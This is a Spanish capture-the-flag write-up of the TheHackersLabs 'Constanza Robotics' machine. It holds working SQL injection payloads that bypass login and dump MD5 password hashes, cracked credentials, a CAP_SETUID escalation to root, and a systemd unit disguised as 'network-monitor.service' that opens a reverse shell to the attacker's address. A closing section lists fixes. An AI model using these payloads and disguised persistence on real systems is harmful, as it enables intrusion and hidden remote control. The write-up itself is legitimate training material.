title: "TheHackersLabs: Constanza Robotics"
date: 2026-08-25
draft: false
description: "Un recorrido completo por Constanza Robotics: enumeración de la superficie expuesta, explotación de SQL injection en el portal de empleados, crackeo de credenciales MD5, acceso SSH, escalada mediante una capability CAP_SETUID mal asignada y persistencia a través de systemd."
tags:
- TheHackersLabs
- Write-up
- SQL Injection
- Linux Capabilities
- Privilege Escalation
- systemd
categories:
- Write-ups

La máquina Constanza Robotics de TheHackersLabs plantea una cadena de ataque que comienza con la enumeración de una intranet de robótica industrial y termina con control administrativo completo del sistema. El punto de entrada es un formulario de autenticación vulnerable a SQL injection, que permite eludir el login, enumerar la base de datos y extraer hashes MD5 de usuarios. Tras recuperar credenciales reutilizadas y validarlas contra SSH, la escalada de privilegios se consigue mediante una capability CAP_SETUID asignada a un binario Python capaz de ejecutar código arbitrario. El compromiso se cierra con el despliegue de persistencia a nivel de sistema mediante una unidad systemd.

IP objetivo: 192.168.0.63. IP atacante: 192.168.0.55. Las flags se muestran parcialmente censuradas para no facilitar la resolución directa a terceros; el objetivo de este artículo es documentar la metodología, no las respuestas.

Reconocimiento — Descubrimiento de hosts
El laboratorio se encuentra dentro de la red local 192.168.0.0/24. Antes de iniciar la enumeración de servicios, se realiza un descubrimiento de hosts para localizar la máquina objetivo:

bash
$ nmap -sP 192.168.0.0/24
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-24 18:51 +0200
MAC Address: 54:B7:BD:09:1F:B2 (Arcadyan)
Nmap scan report for 192.168.0.63
Host is up (0.00032s latency).
MAC Address: 08:00:27:C2:C7:86 (Oracle VirtualBox virtual NIC)
Nmap scan report for 192.168.0.55
Host is up.
Nmap done: 256 IP addresses (6 hosts up) scanned in 11.68 seconds
El host 192.168.0.63 responde y presenta una dirección MAC asociada a una interfaz virtual de Oracle VirtualBox, consistente con una máquina desplegada en el entorno de laboratorio. Se define la variable de objetivo para reutilizarla en los comandos posteriores:

bash
$ export TARGET=192.168.0.63
Desglose de parámetros:

-sP: realiza descubrimiento de hosts sin escanear puertos. En versiones actuales de Nmap esta funcionalidad se identifica como ping scan.

192.168.0.0/24: recorre las 256 direcciones de la subred local.

Reconocimiento — Escaneo TCP y detección de servicios
Con el objetivo identificado, se ejecuta un escaneo SYN sobre el espacio completo de puertos TCP. La detección de versiones y scripts por defecto se incluyen en la misma pasada:

bash
$ sudo nmap -sS -p- --open -sCV --min-rate 5000 -n -Pn -oN nmap_tcp_full.txt "$TARGET"
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-24 18:52 +0200
Nmap scan report for 192.168.0.63
Host is up (0.00032s latency).
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.2p1 Debian 2+deb12u10 (protocol 2.0)
| ssh-hostkey:
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
|_  256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
80/tcp   open  http    Apache httpd 2.4.68 ((Debian))
|_http-title: Constanza Robotics — Robótica industrial de precisión
|_http-server-header: Apache/2.4.68 (Debian)
3306/tcp open  mysql   MariaDB 10.3.23 or earlier (unauthorized)
MAC Address: 08:00:27:C2:C7:86 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 17.56 seconds
Escaneo TCP completo de la máquina objetivo

Desglose de parámetros:

-sS: ejecuta un escaneo SYN; identifica puertos abiertos sin completar el handshake TCP.

-p-: recorre todos los puertos TCP, del 1 al 65535.

--open: limita la salida a los puertos abiertos.

-sC: ejecuta los scripts NSE por defecto.

-sV: activa la detección de versiones de servicio.

--min-rate 5000: establece una tasa mínima de 5000 paquetes por segundo para acelerar el escaneo.

-n: desactiva la resolución DNS inversa.

-Pn: omite la fase de descubrimiento ICMP y trata el host como activo.

-oN nmap_tcp_full.txt: guarda la salida normal de Nmap en un archivo.

La superficie inicial queda formada por tres servicios:

Puerto 22/TCP: OpenSSH 9.2p1 sobre Debian.

Puerto 80/TCP: Apache HTTP Server 2.4.68, que presenta la web de Constanza Robotics.

Puerto 3306/TCP: MariaDB expuesto, aunque Nmap identifica que no permite acceso no autenticado.

El servicio web se convierte en el vector prioritario de enumeración. La exposición de MariaDB es un hallazgo relevante, pero no se obtuvo acceso directo a la base de datos a través de red durante esta cadena; la información se recuperó posteriormente mediante la vulnerabilidad de la aplicación web.

Web — Enumeración de contenido
Se realiza fuerza bruta de directorios y archivos contra la raíz del servidor web. Se emplea la wordlist media de DirBuster, extensiones habituales de aplicaciones web y un filtro por tamaño para eliminar la respuesta homogénea de error:

bash
$ ffuf -c -u "http://$TARGET/FUZZ" \
  -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt \
  -ic -e .php,.html,.js,.txt,.bak \
  -mc 200,204,301,302,307,401,403 \
  -fs 7867 -rate 100 -t 30 \
  -of json -o ffuf_root.json

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev

:: Method           : GET
:: URL              : http://192.168.0.63/FUZZ
:: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
:: Extensions       : .php .html .js .txt .bak
:: Output file      : ffuf_root.json
:: File format      : json
:: Follow redirects : false
:: Calibration      : false
:: Timeout          : 10
:: Threads          : 30
:: Matcher          : Response status: 200,204,301,302,307,401,403
:: Filter           : Response size: 7867

.php            [Status: 403, Size: 317, Words: 21, Lines: 10, Duration: 0ms]
.html           [Status: 403, Size: 317, Words: 21, Lines: 10, Duration: 0ms]
login.php       [Status: 200, Size: 1091, Words: 179, Lines: 30, Duration: 3ms]
assets          [Status: 301, Size: 353, Words: 21, Lines: 10, Duration: 0ms]
contacto.html   [Status: 200, Size: 4541, Words: 894, Lines: 102, Duration: 14ms]
productos.html  [Status: 200, Size: 6087, Words: 1339, Lines: 141, Duration: 11ms]
Enumeración de contenido web con ffuf

Desglose de parámetros:

-c: habilita color en la salida del terminal.

-u: define la URL objetivo; FUZZ marca la posición donde se inserta cada entrada de la wordlist.

-w: indica el diccionario de directorios y archivos.

-ic: ignora los comentarios de la wordlist.

-e: añade extensiones a cada candidato de la wordlist.

-mc: conserva respuestas cuyos códigos HTTP coinciden con los estados indicados.

-fs 7867: filtra respuestas con tamaño de 7867 bytes, correspondientes al contenido no relevante detectado durante el escaneo.

-rate 100: limita la tasa a 100 solicitudes por segundo.

-t 30: ejecuta 30 hilos concurrentes.

-of json -o ffuf_root.json: guarda los resultados en formato JSON.

La enumeración revela login.php como ruta de interés, además del directorio assets y de las páginas públicas contacto.html y productos.html.

Web — Análisis del formulario de autenticación
La página principal se presenta como el sitio corporativo de Constanza Robotics, una empresa ficticia centrada en robótica industrial. Desde la navegación se localiza un acceso de empleados que conduce a login.php.

Página principal de Constanza Robotics

Formulario de acceso de empleados

El formulario utiliza el método POST y envía los parámetros username y password a login.php. Para conocer el comportamiento normal del endpoint se intercepta una autenticación fallida con Burp Suite:

text
POST /login.php HTTP/1.1
Host: 192.168.0.63
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 27
Origin: http://192.168.0.63
Connection: keep-alive
Referer: http://192.168.0.63/login.php
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=test&password=test
La respuesta devuelve HTTP/1.1 401 Unauthorized y el mensaje Usuario o contraseña incorrectos.:

text
HTTP/1.1 401 Unauthorized
Date: Mon, 24 Aug 2026 20:23:44 GMT
Server: Apache/2.4.68 (Debian)
Content-Length: 1150
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<div class="alert">Usuario o contraseña incorrectos.</div>
Burp Suite: línea base con credenciales inválidas y respuesta HTTP 401

Esta respuesta de referencia permite comparar el efecto de las pruebas posteriores sobre los parámetros del formulario.

Explotación — SQL injection y bypass de autenticación
Se modifica el parámetro username con un payload que cierra la cadena prevista, introduce una condición siempre verdadera y comenta la parte restante de la sentencia:

text
POST /login.php HTTP/1.1
Host: 192.168.0.63
Content-Type: application/x-www-form-urlencoded

username=' OR 1=1#&password=test
La aplicación responde con HTTP 200 OK y comunica que se ha iniciado sesión como pperez:

text
HTTP/1.1 200 OK
Date: Mon, 24 Aug 2026 21:12:19 GMT
Server: Apache/2.4.68 (Debian)
Content-Type: text/html; charset=UTF-8

<div class="alert ok">
  Sesión iniciada como <strong>pperez</strong>
  (rol: user).
</div>
Burp Suite: bypass de autenticación mediante SQL injection

El operador OR 1=1 fuerza una condición verdadera y # inicia un comentario hasta el final de la sentencia en sintaxis MySQL/MariaDB. La contraseña introducida deja de participar en la evaluación de la consulta comentada. La respuesta confirma que la entrada de username puede alterar la lógica SQL ejecutada por el backend.

El comportamiento observado es compatible con una consulta creada por concatenación directa de las entradas de usuario. No se obtuvo el código fuente de login.php, por lo que el siguiente fragmento representa el patrón vulnerable inferido a partir de las respuestas:

php
// Patrón vulnerable inferido a partir del comportamiento observado
$query = "SELECT username, password, role
          FROM users
          WHERE username='$username' AND password='$password'";
Explotación — Enumeración de columnas y campos reflejados
Una vez confirmado el vector, se determina el número de columnas de la consulta original con ORDER BY. La condición inicial se mantiene verdadera para evitar que el resultado quede confundido con un fallo de autenticación normal:

text
username=' OR 1=1 ORDER BY 1-- -&password=x  → 200 OK
username=' OR 1=1 ORDER BY 2-- -&password=x  → 200 OK
username=' OR 1=1 ORDER BY 3-- -&password=x  → 200 OK
username=' OR 1=1 ORDER BY 4-- -&password=x  → falla / rompe el bypass
La petición hasta ORDER BY 3 devuelve una respuesta de autenticación válida:

text
POST /login.php HTTP/1.1
Host: 192.168.0.63
Content-Type: application/x-www-form-urlencoded

username=' OR 1=1 ORDER BY 3-- -&password=test
text
HTTP/1.1 200 OK

<div class="alert ok">
  Sesión iniciada como <strong>csalas</strong>
  (rol: admin).
</div>
Burp Suite: conteo de columnas con ORDER BY 3

El fallo al alcanzar ORDER BY 4, frente a la respuesta correcta hasta la posición 3, indica que la consulta dispone de tres columnas. Con ese dato se construye una unión con tres valores controlados:

text
POST /login.php HTTP/1.1
Host: 192.168.0.63
Content-Type: application/x-www-form-urlencoded

username=' UNION SELECT 'colA','colB','colC'-- -&password=test
text
HTTP/1.1 200 OK

<div class="alert ok">
  Sesión iniciada como <strong>colB</strong>
  (rol: colC).
</div>
Burp Suite: identificación de columnas reflejadas con UNION SELECT

La respuesta identifica las posiciones útiles para exfiltración:

La segunda columna se refleja como nombre de usuario dentro de Sesión iniciada como.

La tercera columna se refleja como rol.

La primera columna no se muestra en la interfaz, aunque debe conservar compatibilidad de tipo y posición con la consulta original.

Explotación — Enumeración de tablas y extracción de credenciales
Con una columna reflejada identificada, se consulta el catálogo de MariaDB para recuperar las tablas del esquema activo. Se emplea GROUP_CONCAT para devolver los resultados en una única respuesta y 0x7c como separador |:

text
POST /login.php HTTP/1.1
Host: 192.168.0.63
Content-Type: application/x-www-form-urlencoded

username=' UNION SELECT 'colA',GROUP_CONCAT(table_name,0x7c),'x'
FROM information_schema.tables WHERE table_schema=database()-- -&password=test
La aplicación refleja users| en la posición correspondiente al usuario:

text
HTTP/1.1 200 OK

<div class="alert ok">
  Sesión iniciada como <strong>users|</strong>
  (rol: x).
</div>
Burp Suite: enumeración de la tabla users desde information_schema

Se consulta después el contenido de la tabla users, concatenando nombre de usuario, hash de contraseña y rol. Los valores hexadecimales 0x3a y 0x7c representan : y |, respectivamente:

text
POST /login.php HTTP/1.1
Host: 192.168.0.63
Content-Type: application/x-www-form-urlencoded

username=' UNION SELECT 'colA',GROUP_CONCAT(username,0x3a,password,0x3a,role,0x7c),'x'
FROM users-- -&password=test
text
HTTP/1.1 200 OK

<div class="alert ok">
  Sesión iniciada como <strong>pperez:dea56e47f1c62c30b83b70eb281a6c39:user|,agomez:8afa847f50a716e64932d995c8e7435a:user|,jruiz:f25a2fc72690b780b2a14e140ef6a9e0:user|,csalas:0b04f0f2f8a079bf984225c01ba99a0d:admin|,mtorres:aaef70f35bbc718528c1e005e1e59d45:user|,dnavarro:dac8029f94f09117ad4f0dc5f70b69e1:user|</strong>
  (rol: x).
</div>
Burp Suite: extracción de usuarios, hashes MD5 y roles

La extracción devuelve seis registros:

text
pperez:dea56e47f1c62c30b83b70eb281a6c39:user
agomez:8afa847f50a716e64932d995c8e7435a:user
jruiz:f25a2fc72690b780b2a14e140ef6a9e0:user
csalas:0b04f0f2f8a079bf984225c01ba99a0d:admin
mtorres:aaef70f35bbc718528c1e005e1e59d45:user
dnavarro:dac8029f94f09117ad4f0dc5f70b69e1:user
Los valores de 32 caracteres hexadecimales son compatibles con hashes MD5. El registro administrativo csalas es especialmente relevante desde el punto de vista de impacto, pero en esta fase se preparan todos los hashes obtenidos para comprobar reutilización de credenciales en el acceso SSH expuesto.

Explotación — Crackeo de hashes MD5
Los hashes se almacenan en un fichero en formato usuario:hash:

bash
$ cat hashes.txt
pperez:dea56e47f1c62c30b83b70eb281a6c39
agomez:8afa847f50a716e64932d995c8e7435a
jruiz:f25a2fc72690b780b2a14e140ef6a9e0
csalas:0b04f0f2f8a079bf984225c01ba99a0d
mtorres:aaef70f35bbc718528c1e005e1e59d45
dnavarro:dac8029f94f09117ad4f0dc5f70b69e1
Se ejecuta John the Ripper en modo raw-md5 contra la wordlist rockyou.txt:

bash
$ john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
Using default input encoding: UTF-8
Loaded 6 password hashes with no different salts (Raw-MD5 [MD5 256/256 AVX2 8x3])
Remaining 3 password hashes with no different salts
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:00 DONE (2026-08-24 23:25) 0g/s 32598Kp/s 32598Kc/s 97795KC/s fuckyooh21..*7¡Vamos!
Session completed.
La salida del proceso permite recuperar tres contraseñas:

bash
$ john --show --format=raw-md5 hashes.txt
pperez:barcelona
agomez:princess
jruiz:iloveyou
3 password hashes cracked, 3 left
John the Ripper: recuperación de contraseñas a partir de hashes MD5

Desglose de parámetros:

--format=raw-md5: fuerza a John a interpretar los valores como hashes MD5 sin sal.

--wordlist=/usr/share/wordlists/rockyou.txt: utiliza la wordlist especificada para intentar recuperar contraseñas por diccionario.

--show: muestra las credenciales recuperadas durante la sesión de crackeo.

El uso de MD5 sin sal y de contraseñas presentes en una wordlist pública convierte la protección de las credenciales en insuficiente. Las tres credenciales obtenidas se validan contra el servicio SSH para comprobar si existe reutilización entre la aplicación y el sistema operativo.

Movimiento lateral — Validación de credenciales y acceso SSH
Se prepara un fichero con las credenciales recuperadas y se prueba contra SSH con una única tarea, evitando generar ruido innecesario en el laboratorio:

bash
$ hydra -C creds.txt -t 1 ssh://192.168.0.63
Hydra v9.7 (c) 2023 by van Hauser/THC & David Maciejak
Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2026-08-24 23:30:57
[DATA] max 1 task per 1 server, overall 1 task, 3 login tries, ~3 tries per task
[DATA] attacking ssh://192.168.0.63:22/
[22][ssh] host: 192.168.0.63 login: pperez password: barcelona
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2026-08-24 23:31:02
Hydra: validación de pperez:barcelona contra SSH

Desglose de parámetros:

-C creds.txt: carga pares usuario:contraseña desde el fichero indicado.

-t 1: limita la ejecución a una tarea concurrente.

ssh://192.168.0.63: define el módulo y el host de destino.

Hydra confirma que pperez:barcelona es una credencial válida. Se inicia una sesión SSH interactiva:

bash
$ ssh pperez@192.168.0.63
The authenticity of host '192.168.0.63 (192.168.0.63)' can't be established.
ED25519 key fingerprint is: SHA256:09ZSLxiw1tvVbTWbg6eZzfN1d3i5dWrpGIe+aCobTK4
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.0.63' (ED25519) to the list of known hosts.
pperez@192.168.0.63's password:
Linux TheHackersLabs 6.1.0-44-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.164-1 (2026-03-09) x86_64
El aviso de huella desconocida es normal al conectar por primera vez a una máquina de laboratorio. Tras autenticarse, se comprueba la identidad de la sesión:

bash
pperez@TheHackersLabs:~$ whoami; id
pperez
uid=1001(pperez) gid=1001(pperez) grupos=1001(pperez)
Flags — Acceso de usuario
La flag de usuario se encuentra en el directorio personal de pperez:

bash
pperez@TheHackersLabs:~$ cat user.txt
THL{XXXXXXXXXXXXXXX}
La cuenta obtenida carece de pertenencias a grupos privilegiados visibles en la salida de id, por lo que se continúa con enumeración local para identificar vectores de escalada.

Escalada de privilegios — Enumeración de Linux capabilities
Se buscan capabilities de fichero de forma recursiva. Estas capacidades permiten asignar privilegios concretos a ejecutables sin marcar necesariamente el archivo con SUID:

bash
pperez@TheHackersLabs:~$ getcap -r / 2>/dev/null
/usr/bin/ping cap_net_raw=ep
/opt/maint/pybackup cap_setuid=ep
La capability asociada a /usr/bin/ping es habitual para operaciones de red de bajo nivel. Sin embargo, /opt/maint/pybackup presenta cap_setuid=ep, una asignación crítica al tratarse de un ejecutable Python capaz de ejecutar código proporcionado como argumento.

CAP_SETUID permite manipular los UID del proceso, incluidas operaciones como setuid(2), setreuid(2) y setresuid(2). Si una aplicación que permite ejecución de código conserva esa capacidad, un usuario sin privilegios puede establecer UID 0 y abrir una shell con privilegios efectivos de root.

Escalada de privilegios — Abuso de CAP_SETUID en pybackup
El binario pybackup permite ejecutar código Python mediante el argumento -c. Se invoca os.setuid(0) para elevar el UID efectivo y, a continuación, se reemplaza el proceso por una instancia de Bash que preserve privilegios:

bash
pperez@TheHackersLabs:~$ /opt/maint/pybackup -c 'import os; os.setuid(0); os.execl("/bin/bash", "bash", "-p")'
root@TheHackersLabs:~# id
uid=0(root) gid=1001(pperez) grupos=1001(pperez)
Enumeración y abuso de CAP_SETUID en pybackup

Desglose del payload:

import os: carga el módulo estándar de Python para interactuar con el sistema operativo.

os.setuid(0): asigna el UID 0 al proceso. La operación tiene éxito por la capability CAP_SETUID efectiva sobre pybackup.

os.execl("/bin/bash", "bash", "-p"): reemplaza el proceso Python por Bash. La opción -p conserva los privilegios efectivos en el nuevo proceso.

La asignación de CAP_SETUID a un binario de esta naturaleza contradice el principio de mínimo privilegio: la capability permite cambios arbitrarios del UID del proceso y debe restringirse exclusivamente a software cuya función lo requiera de forma justificada.

Flags — Acceso a la shell root
Con la shell administrativa obtenida, se verifica el acceso y se recupera la flag final:

bash
root@TheHackersLabs:~# cat /etc/shadow | head -3
root:yj9T$AA9oQMinlq3VEirU87hiR.$1Pdk6G.Cff4rXsZTFZ1FKVXtYOF3uuMjYdb50fIoXX2:20669:0:99999:7:::
daemon::20012:0:99999:7:::
bin::20012:0:99999:7:::

root@TheHackersLabs:~# cat /root/root.txt
THL{XXXXXXXXXXXXXXXXXX}
Enumeración de /etc/shadow y flag root

El acceso a /etc/shadow y a /root/root.txt confirma control administrativo completo sobre la máquina.

Persistencia — Servicio systemd con reverse shell
Tras obtener root, se crea una unidad systemd con un nombre aparentemente operativo. El servicio inicia una reverse shell hacia la máquina atacante y queda habilitado para ejecutarse al arrancar el sistema:

bash
root@TheHackersLabs:~# nano /etc/systemd/system/network-monitor.service
root@TheHackersLabs:~# cat /etc/systemd/system/network-monitor.service
[Unit]
Description=Network Monitoring Service
After=network.target

[Service]
Type=simple
ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/192.168.0.55/4444 0>&1'
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
bash
root@TheHackersLabs:~# systemctl daemon-reload
root@TheHackersLabs:~# systemctl enable network-monitor.service
Created symlink /etc/systemd/system/multi-user.target.wants/network-monitor.service → /etc/systemd/system/network-monitor.service.
root@TheHackersLabs:~# systemctl start network-monitor.service
root@TheHackersLabs:~# systemctl is-enabled network-monitor.service
enabled
root@TheHackersLabs:~# systemctl status network-monitor.service
● network-monitor.service - Network Monitoring Service
     Loaded: loaded (/etc/systemd/system/network-monitor.service; enabled; preset: enabled)
     Active: active (running) since Mon 2026-08-24 23:52:30 CEST; 6s ago
   Main PID: 1112 (bash)
      Tasks: 2 (limit: 2315)
     Memory: 1016.0K
        CPU: 6ms
     CGroup: /system.slice/network-monitor.service
             ├─1112 /bin/bash -c "bash -i >& /dev/tcp/192.168.0.55/4444 0>&1"
             └─1113 bash -i

ago 24 23:52:30 TheHackersLabs systemd[1]: Started network-monitor.service - Network Monitoring Service.
Desglose de la unidad:

After=network.target: retrasa el inicio hasta que la pila de red está disponible.

Type=simple: configura el proceso lanzado por ExecStart como proceso principal del servicio.

ExecStart: define el comando ejecutado al iniciar el servicio. En este caso Bash redirige entrada, salida y error a una conexión TCP de vuelta al atacante.

Restart=always: relanza el servicio si el proceso finaliza.

RestartSec=10: espera diez segundos antes de cada reinicio.

WantedBy=multi-user.target: habilita el arranque de la unidad dentro del objetivo multiusuario.

Desde la máquina atacante se inicia un listener en el puerto definido:

bash
$ nc -nlvp 4444
listening on [any] 4444 ...
connect to [192.168.0.55] from (UNKNOWN) [192.168.0.63] 46442
bash: no se puede establecer el grupo de proceso de terminal (1112): Función ioctl no apropiada para el dispositivo
bash: no hay control de trabajos en este shell
root@TheHackersLabs:/# id && hostname
uid=0(root) gid=0(root) grupos=0(root)
TheHackersLabs
Reverse shell recibida y confirmación de privilegios root

Desglose de parámetros de Netcat:

-n: evita la resolución DNS.

-l: activa modo escucha.

-v: muestra información adicional sobre la conexión entrante.

-p 4444: establece el puerto local de escucha.

Los avisos sobre el grupo de proceso del terminal y la ausencia de control de trabajos son habituales en shells inversas sin TTY asignada. No impiden confirmar la conexión ni los privilegios de la sesión recibida.

Conclusión
La cadena de compromiso combina varios fallos que se refuerzan entre sí:

La autenticación web es vulnerable a SQL injection, lo que permite eludir el control de acceso y consultar información interna de la base de datos.

Las contraseñas se almacenan como hashes MD5 sin sal y al menos tres coinciden con valores débiles presentes en una wordlist pública.

Una credencial recuperada de la aplicación se reutiliza en SSH, proporcionando acceso inicial al sistema operativo.

El binario /opt/maint/pybackup dispone de CAP_SETUID aun cuando puede ejecutar código Python, lo que permite escalar directamente a UID 0.

Una vez comprometida la cuenta root, una unidad systemd habilitada en multi-user.target permite mantener acceso tras reinicios.

Las medidas correctivas prioritarias son eliminar la concatenación de entradas en las consultas SQL y emplear consultas parametrizadas, sustituir MD5 por un algoritmo de hashing de contraseñas adaptativo y con sal, impedir la reutilización de credenciales entre aplicación y sistema, retirar CAP_SETUID de binarios que no lo requieran y auditar unidades systemd no autorizadas.

Contenido desarrollado exclusivamente en entornos autorizados, con fines formativos y de investigación.
